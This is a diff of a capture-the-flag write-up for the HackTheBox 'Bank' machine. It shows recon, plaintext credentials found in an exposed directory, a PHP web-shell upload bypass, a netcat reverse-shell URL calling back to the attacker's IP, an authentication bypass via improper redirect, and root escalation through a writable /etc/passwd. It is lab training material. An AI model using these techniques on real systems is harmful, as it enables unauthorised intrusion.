@@ -1,8 +1,10 @@
 ![](images/boxInfo.png)
 
+# Recon
+
 ## nmap 
-nmap -sC -sV 10.10.10.29
-```
+```console
+root@kali:~# nmap -sC -sV 10.10.10.29
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 20:35 EDT
 Nmap scan report for 10.10.10.29
 Host is up (0.55s latency).
@@ -27,44 +29,48 @@ Nmap done: 1 IP address (1 host up) scanned in 96.61 seconds
 ```
 
 ## gobuster
+```bash
+gobuster dir -u 10.10.10.29 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
+```
 gobuster didn't gave any results for 10.10.10.29  
-all exploits for ISC BIND 9.9.5 using "searchsploit isc bind" were denial of service so not useful  
-adding 10.10.10.29 to /etc/hosts as bank.htb and then visiting bank.htb gave a login page
+`searchsploit isc bind` --> all exploits for `ISC BIND 9.9.5` were denial of service so not useful  
+
+adding `10.10.10.29` to `/etc/hosts` as `bank.htb` and then visiting bank.htb gave a login page
 
 ![](images/loginPage.png)
 
 sqlmap didn't gave any results for the login page  
-running gobuster for bank.htb gave /assets and /inc which contain some files but they were not useful  
-```
-/root/go/bin/gobuster dir -u bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
+running gobuster for `bank.htb` gave `/assets` and `/inc` which contain some files but they were not useful  
+```bash
+gobuster dir -u bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
 ```
 
 ![](images/gobuster.png)
 
 ![](images/assets.png)
 
-## plain text creds
-visiting /balance-transfer we see a lot of .acc files with username emailID and password in encrypted hex
+# Plain Text Creds
+visiting `/balance-transfer` we see a lot of `.acc` files with username emailID and password in encrypted hex
 
 ![](images/balanceTransfer.png)
 
 ![](images/encryptedCreds.png)
 
 there might be something important in one of these files so we can try to find a file of different size than others  
-most files that i see are between 582-585 in size so i used this command to find a different file
-```
+most files that I see are between 582-585 in size so I used `curl` and `grep` to find a different file
+```bash
 curl http://bank.htb/balance-transfer/ | grep -v '/td><td align="right">58'
 ```
 
 ![](images/curl.png)
 
-we can see in the output of above command that "68576f20e9732f1b2edc4df5b8533230.acc" is just 257 bytes  
+we can see in the output of above command that `68576f20e9732f1b2edc4df5b8533230.acc` is just 257 bytes  
 this file had username emailID and password in plain text  
 
 ![](images/acc_creds.png)
 
-## php reverse shell
-we can now login using "chris@bank.htb:!##HTBB4nkP4ssw0rd!##" and there is a file upload functionality in /support.php  
+# Reverse Shell
+we can now login using `chris@bank.htb:!##HTBB4nkP4ssw0rd!##` and there is a file upload functionality in `/support.php`  
 trying to upload php file give error that only image upload is allowed 
 
 ![](images/phpError.png)
@@ -73,24 +79,25 @@ in the source code of /support.php we can see this comment
 
 ![](images/comment.png)
 
-uploading php file with .htb extension allows to execute php code  
-after uploading shell.htb we can visit the following URL to get a shell  
+uploading php file with `.htb` extension allows to execute php code  
+after uploading `shell.htb` we can visit the following URL to get a shell  
 ```
 http://bank.htb/uploads/shell.htb?c=nc 10.10.14.31 8888 -e /bin/bash
 ```
 
 ![](images/reverseShell.png)
 
+# Alternate Way
 ## Improper Redirect
 we can also upload the shell.htb file without having to login as chris because of improper redirect  
-/support.php gets redirected to /login.php if we are not logged in but it also gives the content of /support.php before the redirect  
-so we can still upload the file without login by changing the "302 FOUND" to "200 OK" in burp and then access the uploaded file from /uploads/shell.htb  
+`/support.php` gets redirected to `/login.php` if we are not logged in but it also gives the content of /support.php before the redirect  
+so we can still upload the file without login by changing the `302 FOUND` to `200 OK` in burp and then access the uploaded file from `/uploads/shell.htb`  
 as curl does not allow redirect by default we can curl /support.php to see that it gives "302 FOUND" but still gives the content
 
 ![](images/improperRedirect.png)
 
 # privEsc
-## Method 1 - suid
+## Method 1 - SUID
 found an uncommon suid binary 
 ```
 find / -perm -u=s 2>/dev/null
@@ -99,7 +106,7 @@ find / -perm -u=s 2>/dev/null
 ![](images/privEsc.png)
 
 ## Method 2 - /etc/passwd
-looking through the results of LinEnum.sh, we can see that we have write access on /etc/passwd  
+looking through the results of `LinEnum.sh`, we can see that we have write access on /etc/passwd  
 so we can either change the root password or add another user in /etc/passwd to get root shell  
 
 ![](images/etcPasswd_permissions.png)
@@ -110,9 +117,10 @@ we can use openssl to generate the encrypted password
 
 ![](images/nano_etcPasswd.png)
 
-after adding a new user with root privileges we can either switch user using 'su' or SSH as that user  
+after adding a new user with root privileges we can either switch user using `su` or SSH as that user  
 
 ![](images/su.png)
 
 ![](images/ssh_poison.png)
 
+![](images/prize.png)
